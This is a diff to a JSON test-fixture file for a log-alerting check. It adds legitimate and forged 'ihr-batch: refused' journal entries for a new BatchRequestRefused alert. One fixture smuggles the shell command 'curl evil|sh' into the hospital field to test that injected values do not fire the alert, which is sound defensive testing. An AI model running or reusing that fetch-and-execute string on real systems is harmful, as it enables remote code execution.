@@ -1,5 +1,5 @@
 {
- "_comment": "scripts/check-logs.py: these journal entries go through the real redaction steps into a throwaway VictoriaLogs, then vmalert runs deploy/logs/alerts/ on them. 'expect' lists, per alert, the values of its key label it must fire (or wait to fire) for, and no others: client_ip, hospital for PackApplyFailed, HospitalNotServed and ReleaseWindowOverrun, or reason for DatabaseRoleRefused.",
+ "_comment": "scripts/check-logs.py: these journal entries go through the real redaction steps into a throwaway VictoriaLogs, then vmalert runs deploy/logs/alerts/ on them. 'expect' lists, per alert, the values of its key label it must fire (or wait to fire) for, and no others: client_ip, hospital for PackApplyFailed, HospitalNotServed and ReleaseWindowOverrun, or reason for DatabaseRoleRefused (hospital for BatchRequestRefused).",
  "fixtures": [
   {
    "count": 1,
@@ -1140,6 +1140,146 @@
     "CONTAINER_NAME": "indiehr-staging-db-1",
     "COM_DOCKER_COMPOSE_SERVICE": "db"
    }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=users-list",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=alpha reason=bad_url method=PUT route=unresolved",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=kappa reason=nested method=POST route=batch-requests-list",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "10.0.0.9 - - [x] \"GET /ihr-batch: refused hospital=webforged reason=not_listed method=GET route=x\" 404 179",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=traefikforged reason=not_listed method=GET route=x",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-traefik-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "traefik"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=workerforged reason=not_listed method=GET route=x",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-celery-worker-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "celery-worker"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=reasonforged reason=forged method=GET route=x",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=pathforged reason=not_listed method=GET route=/api/v1/users/",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=longforged reason=not_listed method=GET route=x (and more)",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-batch: refused hospital=x;curl evil|sh; reason=not_listed method=GET route=x",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
   }
  ],
  "expect": {
@@ -1184,6 +1324,10 @@
   ],
   "DatabaseRoleLoginFailed": [
    "ihr_app"
+  ],
+  "BatchRequestRefused": [
+   "alpha",
+   "kappa"
   ]
  },
  "expect_state": {
@@ -1196,6 +1340,7 @@
   "ReleaseWindowOverrun": "firing",
   "DatabaseRoleRefused": "firing",
   "DatabaseSchemaGated": "firing",
-  "DatabaseRoleLoginFailed": "firing"
+  "DatabaseRoleLoginFailed": "firing",
+  "BatchRequestRefused": "firing"
  }
 }
